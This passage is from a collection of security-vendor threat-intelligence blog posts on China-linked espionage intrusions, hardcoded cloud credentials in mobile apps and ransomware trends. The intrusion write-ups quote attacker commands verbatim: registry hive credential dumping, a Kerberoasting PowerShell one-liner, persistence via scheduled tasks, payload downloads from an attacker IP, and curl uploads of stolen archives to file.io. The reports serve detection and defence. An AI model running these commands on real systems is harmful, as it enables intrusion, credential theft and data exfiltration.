Typhoon). Living off the land:The attackers also made use of several living-off-the-land tools, including: NBTScan:An open-source command-lineNetBIOS scanner. PlugX (Korplug):A remote access Trojan (RAT) that can download additional plugins to enhance its capability beyond information gathering. The malware was initially associated solely with multiple Chinese state-backed threat actors, including Budworm (aka APT27, Emissary Panda, Lucky Mouse) and Fireant (aka Mustang Panda, APT31, Stately Taurus). However, a range of other threat actors outside of China have used the malware since its source code was allegedly leaked in 2015. Rakshasa:A proxy tool written in Go, designed specifically for multi-level proxying and internal network penetration. The tool has beenused previously by Earth Baku. In addition, the language used in the tool is simplified Chinese. ReverseSSH:A statically linkedSSH serverwith reverse shell functionality. SharpGPOAbuse:A.NET applicationwritten in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO. SharpNBTScan:A NetBIOSscanning toolwritten in C#. The tool wasused previouslyby the China-linked APT group known as Fireant (aka Mustang Panda, APT31, Stately Taurus). Stowaway Proxy Tool:Apublicly available multi-hop proxy toolthat allows users to easily proxy their network traffic to intranet nodes. TightVNC:Open-sourceremote desktop software. WinRAR:Anarchive managerthat can be used to archive or zip files – for example, prior to exfiltration. The following activity occurred on one of the targeted organizations’ networks. In this instance, the attackers remained active for at least three months, between June and August 2024, focusing on intelligence gathering—specifically collecting and likely exfiltrating data of interest. While this case highlights a particular approach, in other attacks, the threat actors employed additional tactics, techniques, and procedures (TTPs), such as DLL sideloading, and leveraged tools like Rakshasa and SharpGPOAbuse, among others, to achieve their objectives. The first indication of malicious activity within this organization was on May 27 at 14:15 local time, where a suspicious PowerShell command was executed. The command was used to modify the registry, specifically the system policies, to enable 'LocalAccountTokenFilterPolicy'. This value is responsible for controlling how local accounts are filtered when they are used to access a Windows system remotely. By setting the key to value '1', it effectively disables Remote UAC filtering for local accounts, allowing local admin accounts to use elevated tokens (with full admin rights when connecting remotely). At 14:18, another suspicious command was executed via the WMI service: cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1716819456.018484 2>&1 This pipe naming convention typically indicates a remote tool leveraging Impacket is being used to execute the commands (also corroborated via process lineage). This is a common command observed as part of tooling used in lateral movement such as wmiexec. At 14:22, several additional discovery commands were executed: These commands were used to display wireless network profile information, including network names for any wireless network that was connected to in the past. The net share command lists any available network shares. The netstat command lists all active (established and listening) TCP connections on the machine. The next day on May 28 at 12:51, another suspicious command was executed via WMI: cmd.exe /Q /c move ChromeUpdate.dat ChromeUpdate.exe 1> \\\\127.0.0.1\\ADMIN$\\__1716900555.2954416 2>&1 The command was used to rename a likely uploaded file called ChromeUpdate.dat (SHA-256: 8b6d081be732743aa6f6bccfb68b3f21878aa36723c1311f50406d752aacc9fa) to ChromeUpdate.exe. Next, the file was executed, passing ‘install' as a command-line argument: ChromeUpdate.exe /install The file contained an encrypted embedded keylogger payload for 64-bit systems. At 13:07, several suspicious registry edits and scheduled task-related commands were executed: reg add hklm\\software\\microsoft\\windows\\CurrentVersion\\run /v mscorsvc /t REG_EXPAND_SZ /d \"\\\"CSIDL_PROGRAM_FILESX86\\microsoft.net\\redistlist\\mscorsvw.exe\"\" /f schtasks /create /sc once /st 23:59 /ru \"[REMOVED]\" /tn autorun /tr \"CSIDL_PROGRAM_FILESX86\\microsoft.net\\redistlist\\mscorsvw.exe\" /F schtasks /run /tn autorun These commands were used to create a run key for a file called mscorsvw.exe in the registry using the run key name 'mscorsvc' – this will launch the file every time the system boots. The schtasks command creates a scheduled task called 'autorun' under the user '[REMOVED]' and is configured to run only once at 23:59 on the same day. Directly after this, schtasks was executed to launch the autorun (i.e. mscorsvw.exe) task. At 13:13, another scheduled task was created for a different file: schtasks /create /sc once /st 23:59 /ru \"[REMOVED]\" /tn autorun /tr \"CSIDL_SYSTEMX86\\wbem\\wintulxs.exe -c 38.60.146.78:443 -s 1qaz2wsx4rfv -reconnect 10\" /F This task was scheduled to run once at 23:59 on the same day using the task name 'autorun' to execute a file called 'wintulxs.exe' (SHA-256: d312b0e1968beae5a2ff3be2d8efc6d1bfdab3b1aec6faf8eafa295c47230194). This tool is a freely available Chinese proxy tool calledStowaway, which is described as providing the ability to “proxy external traffic through multiple nodes to the core internal network, breaking through internal network access restrictions.” On May 30 at 03:16, the attackers returned and executed a series of ‘net’ commands to list network share sessions and available shares, and to view available shares on remote hosts. The attackers also mounted network shares. Directly afterwards, the ‘fsutil’ command was executed to list all available file system drives (e.g. C:). net view \\\\192.168.21.65 net use [REMOVED]\\\\192.168.21.108/u:[REMOVED] net use [REMOVED]/d/y net use [REMOVED]\\\\192.168.21.61/u:[REMOVED] At the time of the initial attacker activity on May 27 at 13:41, additional suspicious activity was also observed on another machine. Similar commands to those previously observed were executed as a means to bypass UAC. This time, the commands were executed via TightVNC. reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f net localgroup [REMOVED] [REMOVED] /add reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f At 15:08, another suspicious reg.exe command was executed: \"CSIDL_SYSTEM\\reg.exe\" add \"hklm\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v [REMOVED] /t REG_DWORD /d 0 /f This command was used to modify the Windows registry, specifically to hide a specific account from displaying in the user list during user login. Shortly after at 15:10, the attackers returned and dumped passwords from the registry: cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__1716822622.7074058 2>&1 reg save hklm\\sam sam.hive reg save hklm\\system system.hive cmd.exe /Q /c dir /on CSIDL_PROGRAM_FILES\\winrar\\rar.exe 1> \\\\127.0.0.1\\ADMIN$\\__1716822622.7074058 2>&1 The attackers also checked that WinRAR was installed in the default path, likely using it to collect and later exfiltrate the hive files. On May 28 at 13:51, the attackers used WMI to launch a command prompt. The next day at13:52, the attackers returned and copied an unknown file that masquerades as part of the .NET framework. CSIDL_WINDOWS\\microsoft.net\\framework\\v4.0.30319\\mscorsvw.exe → CSIDL_SYSTEM_DRIVE\\progra~2\\microsoft.net\\redistlist\\mscorsvw.exe. Directly after this, the attackers proceeded to create registry run keys and scheduled a task to execute the sample at 23:59: reg add hklm\\software\\microsoft\\windows\\CurrentVersion\\run /v mscorsvc /t REG_EXPAND_SZ /d \"\\\"CSIDL_PROGRAM_FILESX86\\microsoft.net\\redistlist\\mscorsvw.exe\"\" /f schtasks /create /sc once /st 23:59 /ru \"[REMOVED]\" /tn autorun /tr \"CSIDL_PROGRAM_FILESX86\\microsoft.net\\redistlist\\mscorsvw.exe\" /F schtasks /run /tn autorun Finally, the attackers used schtasks to launch the autorun service, executing mscorsvw.exe. Later, on August 20, the attackers installed a ReverseSSH tool – winupdateser.exe (SHA-256: 779b4a5f53d3128ab53dd8e13c362d6d077c3eb4987f878d7ef3416c801ef0dd). Following this, at 07:32, the attackers created a scheduled task on a remote system to execute an unknown Windows batch file (net.bat) at 15:35 using the task name 'Microsoft\\windows\\TaskScheduler\\Maintenance': schtasks /create /s [REMOVED] /u [REMOVED] /p [REMOVED] /tn \"Microsoft\\windows\\TaskScheduler\\Maintenance\" /tr \"CSIDL_SYSTEM\\net.bat\" /sc once /st 15:35 Shortly afterward, WMI was used to execute ‘ChromeUpdate.exe /install’ in order to install a keylogger. At 08:11, WMI was used to execute ‘ipconfig /all >> %TEMP%\\cc.dat’ to collect network configuration information. On September 4, the attackers returned and created multiple scheduled tasks to execute unknown Windows batch files using the task name 'Microsoft\\windows\\TaskScheduler\\Maintenance' on multiple machines: schtasks /create /s [REDACTED] /u [REMOVED] /p [REMOVED] /tn \"Microsoft\\windows\\TaskScheduler\\Maintenance\" /tr \"CSIDL_WINDOWS\\temp\\[REDACTED]udpate.bat\" /sc once /st 15:58 On August 6 at 12:21, the attackers accessed another machine where they executed a script (ime.bat) in order to install a new authentication mechanism called Win32Pro. reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Kerberos /v Auth0 /t REG_SZ /d \"Win32Pro\" /f >>c:\\windows\\ime\\ime.log REG QUERY \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Notification Packages\" >>c:\\windows\\ime\\ime.log REG QUERY \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Security Packages\" >>c:\\windows\\ime\\ime.log Following the installation, the attackers launched a file named ‘win32pro.dll’ (SHA-256: 89707a5bf9862a9effb1618a1a285a8d027fb343f6103f4bc68f736889f0a86e) via another file called rpc2.exe (SHA-256: e0f3b8028a2969e280efdd770978a54181fc242dd26cbf0a22e922f1e6a1b951). CSIDL_SYSTEM\\rpc2.exe CSIDL_SYSTEM\\win32pro.dll The file ‘win32pro.dll’ was used to capture and collect user login information including the current time, domain name, username, machine name, and password. Captured credentials were stored in the following locations using the RC4 encryption algorithm with the key \"rfvfsj\": During the course of these operations, the attackers conducted exfiltration activities within targeted organizations. They maintained prolonged access to these networks, often spanning several months, while operating covertly to avoid detection. During this time, they focused on harvesting credentials, including passwords, and mapping the network to identify systems of interest. Exfiltration was carried out through a combination of tactics, including the collection of files of interest using WinRAR, which were subsequently compressed into password-protected archives. These archives were then uploaded to cloud storage services such as File.io, enabling the attackers to stealthily exfiltrate sensitive data while minimizing the risk of exposure. This extended dwell time and calculated approach underscore the sophistication and persistence of the threat actors. CSIDL_SYSTEM\\cmd.exe /c CSIDL_SYSTEM_DRIVE\\program files\\winrar\\rar.exe a -k -r -s -m5 -v100M \"CSIDL_PROFILE\\public\\downloads\\m1.rar\" c:\\users\\public\\downloads\\*.csv CSIDL_SYSTEM\\cmd.exe /c CSIDL_SYSTEM_DRIVE\\program files\\winrar\\rar.exe a -k -r -s -m5 -v100M \"CSIDL_PROFILE\\public\\downloads\\m2.rar\" C:\\windows\\temp\\Netwrix-Report-20240312112337\\csv-files\\*.csv CSIDL_SYSTEM\\cmd.exe /c CSIDL_SYSTEM_DRIVE\\program files\\winrar\\rar.exe a -k -r -s -m5 -v100M -hp@1232ws \"CSIDL_PROFILE\\public\\downloads\\m3.rar\" CSIDL_PROFILE\\public\\downloads\\[REMOVED]_sdulog.zip CSIDL_SYSTEM\\cmd.exe /c CSIDL_SYSTEM_DRIVE\\program files\\winrar\\rar.exe a -k -r -s -m5 -v100M -hp@1232ws \"CSIDL_PROFILE\\public\\downloads\\m4.rar\" \\\\[REMOVED]\\logs$\\Users\\*.csv CSIDL_SYSTEM\\cmd.exe /c CSIDL_SYSTEM_DRIVE\\program files\\winrar\\rar.exe a -k -r -s -m5 -v100M -hp@1232ws \"CSIDL_PROFILE\\public\\downloads\\m5.rar\" \\\\[REMOVED]\\logs$\\Computers\\*.csv curl -k -F “file=@c:\\users\\public\\[REMOVED]_sdulog.zip” https://file.io curl -k -F \"file=@c:\\users\\public\\downloads\\m3.rar\" https://file.io While the attackers in this campaign used a wide selection of TTPs that differed slightly between targeted organizations, the geographical location of targeted organizations, as well as the use of tools linked previously to China-based APT groups, suggests that this activity is the work of China-based actors. Tools leveraged in these attacks have been used by Chinese state-backed groups such as Fireant (aka Mustang Panda, APT31, Stately Taurus),  Earth Baku (aka APT41, Brass Typhoon), Budworm (aka APT27, Emissary Panda, Lucky Mouse), and others. However, due to many of these groups frequently sharing tools and using similar TTPs, specific attribution in this case is not possible. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. d312b0e1968beae5a2ff3be2d8efc6d1bfdab3b1aec6faf8eafa295c47230194 – Stowaway e0f3b8028a2969e280efdd770978a54181fc242dd26cbf0a22e922f1e6a1b951 – Loader 33cb9f06338a9ea17107abbdc478071bbe097f80a835bbac462c4bb17cd0b798 – PlugX loader 8b6d081be732743aa6f6bccfb68b3f21878aa36723c1311f50406d752aacc9fa – Keylogger 89707a5bf9862a9effb1618a1a285a8d027fb343f6103f4bc68f736889f0a86e – Keylogger 9fe3ff51443c41fe0be01a55a3a5fbfb261bcf63b3b0cd67f65a2c00a6d52ff3 – Keylogger e6cecba25abd092bfccba825298edecd2fdee6c428d9ae85399fabc54355e31f – Keylogger loader 779b4a5f53d3128ab53dd8e13c362d6d077c3eb4987f878d7ef3416c801ef0dd - ReverseSSH e9572549b2f35f32861ffc9be160e9c8f86e4d9d3dd43c3727f0df4dc2acc944 – Infostealer b7472c6f6cba47ec85fa147c78f3a7a40a4fc5913fe41654ab499a7b1bd4ea2e – Batch file used to register custom DLL to hook into Windows authentication mechanisms 3e4d86c4e1d463b99478f960c9c00f7d11cd0d1fb8dd2948e8340b7bc3550904 – Batch file used to register custom DLL to hook into Windows authentication mechanisms fb603072418da9150673ac9826a46a2b2462c8fc0afeacb2034ecb2b7d666001 – Batch file used to register custom DLL to hook into Windows authentication mechanisms 340e872c814d221989ca2cb93819b9ad307572851b5b3f8bfcf791ff08e0e677 – Suspicious Windows script file 80c3effc8f017b26c549bed8ba82097a6be7a59e383dd35adc917bf661e0a754 – Windows script file that drops SharpGPOAbuse and Rakshasa 9b1794a1c8c59631d95178c7c4e2f5917b84864b342b4cfdab8f0990c3dbf5d2 – FastReverseProxy ca0eeb4b71d4124dec785a9492970e9b1cfaa4cab0e8ca4486fc14b2e256d7f7 – Inveigh d7b85b92fb185272b89a7ff27424bff22a5a6542f6bde9838482aa9f87979828 – Dismap fa6de0d0bc9d83a3942aa8b3a12a5924dc662bec32cb3c2f212a0a0c0a4ebc7a – SharpNbtscan 10029f14f2718362144b0e9b660994e8fb944af9ce9fcff04925f8b0615bb509 – SharpGPOAbuse aa096f18e712ac0604e18d16441b672fcb393de9edf3ff4393519c48ab26a158 – Rakshasa 386eb7aa33c76ce671d6685f79512597f1fab28ea46c8ec7d89e58340081e2bd – Bitdefender Crash Handler (2011) 38.60.146[.]78:443 – Stowaway 118.107.219[.]66:443 – Stowaway 45.123.188[.]180 – FastReverseProxy 198.244.237[.]131 – Rakshasa download The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/china-southeast-asia-espionage"
  },
  {
    "title": "us china espionage",
    "content": "A large U.S. organization with a significant presence in China was the subject of a targeted attack earlier this year, during which the attackers obtained a persistent presence on its network, seemingly for the purpose of intelligence gathering. The attack was likely carried out by a China-based threat actor, since some of the tools used in this attack have been previously associated with Chinese attackers. While it is possible that actual network intrusion occurred earlier, the first evidence of the attacker’s activity dates from April 2024, and this malicious activity continued until August 2024. The attackers moved laterally across the organization’s network, compromising multiple computers. Some of the machines targeted were Exchange Servers, suggesting the attackers were gathering intelligence by harvesting emails. Exfiltration tools were also deployed, suggesting that targeted data was taken from the organizations. DLL-sideloading:The attackers used several legitimate applications to load malware, a technique known as DLL-sideloading, where the attackers use the DLL search order mechanism in Windows to plant and then invoke a legitimate application that executes a malicious DLL payload. In this case, several Google and Apple applications were used to perform sideloading (GoogleToolbarNotifier.exe and iTunesHelper.exe). Impacket: An open-sourcecollection of moduleswritten in Python, a general purpose programming language, for programmatically constructing and manipulating network protocols. It contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks. FileZilla: Anopen-source FTP client and serveravailable for Windows, Linux, and macOS. PSCP: ASecure Copy Protocol (SCP) clientcreated by the same developers as the PuTTY SSH client. Living off the land:The attackers also leveraged several living-off-the-land tools, including: The initial infection vector remains unknown. However, the first evidence of malicious activity dates from April 11, 2024, when a suspicious command was executed on one computer via WMI, which bore the hallmarks of a tool leveraging Impacket from another machine on the network:cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1712807675.4462686 2>&1 cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__1712807675.4462686 2>&1 The fact that the command originated from another machine on the network suggests that the attackers had already compromised at least one other machine on the organization’s network and that the intrusion may have begun prior to April 11. The attackers then attempted to mount a network share using the “net use” command. Next, they dumped credentials from the registry using reg.exe: reg save hklm\\system ss A minute later, they attempted to mount another network share, using the “net use” command, specifically attempting to mount a drive connected to a network attached storage (NAS) device. A few hours later, the attackers returned and ran netstat to check for all open TCP (active and listening) connections. The attackers then executed another encoded PowerShell script, which decoded as: $ProgressPreference=\"SilentlyContinue\";setspn.exe -T medin.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() } The command queries Active Directory (AD) for service principal names (SPNs), which are accounts associated with services within the AD. The command then processes the output to extract relevant details and then extracts a Kerberos security token for each matching SPN. This is a tactic called Kerberoasting and is used to steal credentials specifically for service accounts, which the attackers likely attempt to crack offline in an effort to gain access to privileged accounts to assist in moving laterally across the network. It is also interesting to note that the domain specified in the above command “medin.local” is the default domain name used in a number of publicly available Kerberoast tools and scripts, suggesting the attackers are directly leveling off-the-shelf tooling without any modifications. The attackers were then observed modifying some of the commands and executing several further PowerShell commands, this time with the correct domain: $ProgressPreference=“SilentlyContinue”;setspn -T [REMOVED] -Q */* $ProgressPreference=“SilentlyContinue”;klist $ProgressPreference=“SilentlyContinue”;klist  tgt The “klist” command lists the current Kerberos tickets for the user, giving visibility into the user's active Kerberos authentication status. Additionally, “tgt” refers to the Ticket Granting Ticket, which is a special type of ticket used to authenticate to the Key Distribution Center (KDC). This is likely targeted by the attackers to obtain other service tickets to attempt to crack offline. On April 16, malicious activity resumed on the same computer when the attackers launched a command prompt via WMI. The next day, they proceeded to execute a file named rc.exe, which is a renamed version of Google’s application GoogleToolbarNotifier. This file was used to sideload a malicious DLL named gtn.dll. Malicious activity began on a second machine, a web server, on June 2, 2024. The attackers again used the change directory command via WMI, with the structure of the command suggesting that Impacket was used: cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1717319212.299007 2>&1 Minutes later, the attackers ran a file named putty.exe. Despite the name, the application is actually the SFTP component of FileZilla, which is based on PuTTY’s Secure File Transfer Protocol (SFTP) client. This was likely installed for data exfiltration purposes. On June 13, the same file was executed multiple times via WMI. The next day (June 14), PowerShell was used to download files from a remote host to the perflogs directory: powershell (new-object System.Net.WebClient).DownloadFile( 'hxxp://149.28.154.23:443/rar.exe','CSIDL_SYSTEM_DRIVE\\perflogs\\rar.exe') powershell (new-object System.Net.WebClient).DownloadFile( 'hxxp://149.28.154.23:443/vmtools.exe','CSIDL_SYSTEM_DRIVE\\perflogs\\vmtools.exe') Although not recovered, rar.exe was likely the command-line version of WinRAR. The file named vmtools.exe was a renamed version of PSCP, the Secure Copy Protocol (SCP) client created by the same developers as PuTTY SSH. Malicious activity on this computer resumed on June 27, when a number of commands were executed, mostly via PsExec. Among the files run was the legitimate Google application GoogleUpdate.exe. Among the suspicious files found on this machine were two named ibnettle-6.dll and textinputhost.dat. It is possible that one or both were malicious files that were sideloaded. Textinputhost.dat was previously reported by Sophos and Recorded Future as being used by the Chinese Crimson Palace group in attacks against targets in Southeast Asia. Malicious activity began on a third machine on June 2, when WMI was used to execute wevtutil to query the Windows Event Log from a remote machine on the network: wevtutil qe security /rd:true /f:text /q:”*[System[(EventID=4624) or (EventID=4672) or (EventID=4634) or (EventID=4673) or (EventID=4740)]] and *[System[TimeCreated[timediff(@SystemTime)<=2592000000]]]” The command was structured to query the security event log for the following events: Immediately afterwards, the attackers ran a PowerShell script via WMI: cmd.exe /Q /c powershell echo ((new-object Net.Sockets.TcpClient).Connect(\\”192.168.92.92\\”,135)) “open!” 1> \\\\127.0.0.1\\ADMIN$\\__1717327352.4534295 2>&1 It is possible that the attackers are using this script to test connectivity back to another computer on the network specifically to confirm if Microsoft’s remote procedure call (RPC) service was available (port 135). The attackers also attempted to connect to the same machine using port 3389 (usually reserved for RDP): powershell echo ((new-object Net.Sockets.TcpClient).Connect(\\”192.168.92.92\\”,3389)) “open!” The attackers returned on June 20 and launched a command prompt via PsExec from another machine on the network (192.168.88.235). Several net commands were then executed: CSIDL_SYSTEM\\net1 group “Exchange Servers” /domain The commands are used to display information pertaining to specific groups of the domain. One group the attackers were particularly interested in is \"Exchange Servers\", suggesting the attackers were attempting to target mail servers to collect and possibly exfiltrate email data. Later in the same day, a suspicious PowerShell command was executed via PsExec: powershell -exec bypass -command “Get-ADComputer -Filter {enabled -eq $true} -properties *|select Name, DNSHostName, OperatingSystem, LastLogonDate|Format-Table -AutoSize |Out-File -FilePath “ CSIDL_COMMON_APPDATA\\computer.txt -Width ([int]::MaxValue)” The command retrieves all enabled computers from Active Directory along with their name, DNS hostname, operating system, and last logon date. It then formats the information into a table and saves it to a file called computer.txt. Minutes later, the quser command was executed to list all logged in/activate user accounts on the machine. The next day (June 21), the machine was used again to launch a command prompt on another machine on the network: PsExec64.exe \\\\192.168.92.79 -accepteula cmd On June 5, a suspicious command was executed on a fourth computer via WMI: reg.exe export “HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs” CSIDL_WINDOWS\\temp\\ts_2011.tmp The command exports registry key values to a .TMP file. The registry key Control\\Session Manager\\KnownDLLs holds a list of trusted DLLs that the system typically loads from the System32 directory during system boot-up that may be leveraged by other processes. Exporting this key will copy all the registry values associated with these KnownDLLs and may provide information to the attackers on what file names may appear innocuous if reused or, more likely, for the purposes of DLL hijacking. This is a common attack where malicious DLLs are placed in directories to be loaded instead of legitimate system DLLs. One June 13, activity commenced on a fifth machine when a command was executed via WMI to change the directory to the root drive. The attackers then attempted to launch the application iTunesHelper.exe from the PerfLogs directory. This was likely launched to load a malicious DLL (CoreFoundation.dll) using the sideloading technique (we have seen this done many times before with this same binary using CoreFoundation.dll). The available evidence suggests that the organization was breached by a China-based actor. Aside from the fact that DLL sideloading is a widely favored tactic among Chinese groups, the same organization was targeted in 2023 by an attacker with tentative links to the China-based Daggerfly group. The file textinputhost.dat was previously reported bySophosandRecordedFutureas being leveraged by China-based espionage group Crimson Palace in attacks against Southeast Asia. In that case, it was used in conjunction with an executable named rc.exe. The same file name was also used by the attackers who conducted this attack. The behavioral security technologies in Symantec Endpoint Security provide our customers with protection from fileless, Living Off the Land, and behavior-based attacks, including atypical command-line activity and suspicious application behaviors such as non-process executables or DLL sideloading. Read more about those technologieshere. For the latest protection updates, please visit theSymantec Protection Bulletin If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. 9affdcdb398d437e2e1cd9bc1ccf2d101d79fc6d87e95e960e50847a141faa4 — PsExec 51fe904458e216e75909f82a33dc4f163250b498b4e2d365880184e806d3db1a — iTunesHelper 23221b6f95b9e3b165a84570212f2c8681cf888aa0fa78822f8500357eeafaf0 — CoreFoundation.dll 86fd8328765e4803feedf5878a08c149c08d47c336578261a08a3e1933b68daa — PSCP (renamed as vmtools.exe) 472a513eb60cba4a2320ebbc10d84679ebaa1a8f90e5a3764902a456b3936a17 — libnettle-6.dll f2fa6ae29306ed7171f2e9563ced9bbd6e337ed8c389b319df3c6b46eeb050f0 — SFTP component from FileZilla c1bec59afd3c6071b461bb480ff88ba7e36759a949f4850cc26f0c18e4c811a0 — textinputhost.dat edfae1a69522f87b12c6dac3225d930e4848832e3c551ee1e7d31736bf4525ef — PsExec 1f6b69d11a3066e21c40002a25986c44e24a66f023a40e5f49eecaea33f5576d — GoogleUpdate d32cc7b31a6f98c60abc313abc7d1143681f72de2bb2604711a0ba20710caaae — GoogleToolbarNotifier ff91bbe7bd4e6d5498b1332f0ad233dcf0ad5fc0d31f870a92142731354d739c — gtn.dll hxxp://149.28.154[.]23:443 The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/us-china-espionage"
  },
  {
    "title": "exposing danger within hardcoded cloud credentials popular mobile apps",
    "content": "Mobile apps have become an essential part of our everyday lives, with millions of apps downloads on platforms like the Google Play Store and Apple App Store, a hidden threat has emerged that could put user data and backend services at significant risk. Recent analysis has uncovered a troubling trend: several widely-used apps have been found to contain hardcoded and unencrypted cloud service credentials within their codebases. This dangerous practice means that anyone with access to the app's binary or source code could potentially extract these credentials and misuse them to manipulate or exfiltrate data, leading to severe security breaches. In this blog, we will explore specific examples of these vulnerabilities, focusing on apps that have hardcoded Amazon Web Services (AWS) and Microsoft Azure Blob Storage credentials, and discuss best practices that developers should adopt to prevent such issues. The Pic Stitch: Collage Maker app, with over 5 million downloads on the Google Play Store, has been found to contain hardcoded AWS credentials directly within its code, posing a significant security risk. The code snippet from Jadx (Figure. 1-3) reveals that the app uses the method loadAmazonCredential(boolean z) to load the appropriate credentials depending on the environment. If the boolean flag is set to true, the app loads the production credentials, including the production Amazon S3 bucket name, the read and write access keys, and secret keys. Conversely, if the flag is false, the app loads the corresponding staging credentials. Similarly, the same type of insecure credential management has been uncovered in several popular iOS apps (Figure. 4), all of which have embedded hardcoded and unencrypted AWS credentials within their codebases. Three apps in particular—Crumbl,Eureka: Earn Money for Surveys, andVideoshop - Video Editor—exemplify this widespread problem. With over 3.9 million ratings and ranked number 5 in the Food & Drink category on the Apple Store, Crumbl’s code (Figure. 5) initializes an AWSStaticCredentialsProvider with plain-text credentials, including an access key and secret key. These credentials are used to configure AWS services, leaving them exposed and vulnerable to misuse. Furthermore, the inclusion of a WebSocket Secure (WSS) endpoint within the code—\"wss://***.iot.us-west-2.amazonaws.com\"—highlights a significant security oversight. This endpoint, part of the Amazon API URL, is hardcoded with an API Gateway that directly connects to the IoT services on AWS. Exposing such URLs alongside static credentials makes it easier for attackers to potentially intercept or manipulate communications, leading to unauthorized access to the associated AWS resources. This configuration, without proper encryption or obfuscation, presents a serious risk to the integrity of the application and its backend infrastructure. This app, with 402.1K ratings and ranked 61 in the Lifestyle category, hardcodes AWS credentials directly within its code. (Figure. 6) The app allocates an INMAWSCredentials object and initializes it with the access key and secret key, both stored in plain text. These credentials are used to log events to AWS, exposing critical cloud resources to potential attacks. With 357.9K ratings, Videoshop directly embeds AWS credentials in the -[VSAppDelegate setupS3] method. (Figure. 7) These credentials are not encrypted, meaning anyone with access to the app's binary could easily extract them, gaining unauthorized access to the associated S3 buckets and potentially leading to data theft or manipulation. In all of these example apps, hardcoded credentials are used to authenticate with various AWS services, such as S3 buckets for storage and IoT data management. This common practice of embedding sensitive information like AWS keys directly within the code, without any form of encryption or protection, poses a severe risk. Attackers who gain access to these credentials could exploit them to compromise the app's backend infrastructure, steal user data, or cause service disruptions. A similar security issue has been identified in several popular Android apps (Figure. 8) that have hardcoded and unencrypted Microsoft Azure Blob Storage credentials within their source code. These credentials, embedded directly into the apps' binaries, pose significant risks to both the security and privacy of the apps' users. With over 5 million downloads on the Google Play Store, Meru Cabs hardcoded Azure credentials within the UploadLogs service (Figure. 9), embedding a connection string that includes an account key. This connection string is used to manage log uploads, exposing critical cloud storage resources to potential abuse. This app, with over 500K downloads, embeds multiple hardcoded Azure credentials across its codebase. (Figure. 10) These credentials are used for various purposes, such as adding posts, handling invoices, and storing user profiles. The use of plain-text connection strings to access Azure Blob Storage containers puts sensitive data at significant risk. With over 500K downloads, ReSound Tinnitus Relief also hardcodes its Azure Blob Storage credentials. (Figure. 11) These credentials are used to manage various assets and sound files, and their exposure could lead to unauthorized access and data breaches. These hardcoded credentials not only expose the Azure Blob Storage accounts to unauthorized access but also put user data and backend resources at risk. Anyone with access to the app's binary or source code could potentially extract these credentials and misuse them to manipulate or exfiltrate data, leading to severe security breaches. This repeated pattern of insecure credential management across multiple apps highlights the critical need for developers to adopt more secure practices. The examples highlighted in this blog demonstrate the serious security risks posed by hardcoded and unencrypted cloud service credentials in mobile apps. This practice exposes critical infrastructure to potential attacks, endangering user data and backend services. The widespread nature of these vulnerabilities across both iOS and Android platforms underscores the urgent need for a shift towards more secure development practices. Best Practices for Developers To mitigate these risks, developers should follow best practices for managing sensitive information within their applications: By adopting these best practices, developers can significantly reduce the risk of exposing sensitive information and ensure that their applications are secure against potential threats. As the examples in this blog demonstrate, the stakes are high, and it is imperative that security be a top priority in the mobile app development lifecycle. For the latest protection updates, please visit theSymantec Protection Bulletin. Symantec recommends users follow these best practices to stay protected from mobile threats: List of apps with hardcoded credentials used in this research. Yuanjing is a member of Symantec's Security Technology and Response team who are focused on researching and developing automation technologies in mobile security. Tommy is a member of Symantec's Security Technology and Response team who are focused on researching and providing protection against current and future cyber threats. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/exposing-danger-within-hardcoded-cloud-credentials-popular-mobile-apps"
  },
  {
    "title": "ransomware threat level remains high",
    "content": "Ransomware attacks continued to occur at near peak levels during the third quarter of this year, which also saw the newly formed RansomHub group overtake the veteran LockBit operation as the number one ransomware threat. Analysis of data from ransomware leak sites found that ransomware actors claimed 1,255 attacks in the third quarter of 2024, down very slightly from 1,325 in the second quarter, but the overall number of attacks is continuing to trend upwards. The biggest development during the quarter was the decline of LockBit, which was previously the dominant player in the ransomware ecosystem, claiming more than three times more attacks than its nearest rival Qilin in the second quarter. The number of LockBit attacks claimed in the third quarter was 188, down from the 353 attacks claimed in the second quarter. LockBit was the target of aninternational law enforcement operationin February 2024, which impacted its level of activity in the first quarter of this year. By the second quarter, it appeared to recover completely, but it is possible that the operation has led to a loss of trust among LockBit affiliates, particularly since authorities indicated they had collected information that could identify affiliates. The biggest beneficiary of LockBit’s decline was RansomHub,which only became active in February 2024but is now the number one ransomware operation in terms of the number of attacks claimed. RansomHub claimed 191 attacks in the third quarter, up from 75 in the second quarter. The group’s rapid rise may be explained by its success in recruiting experienced affiliates for its 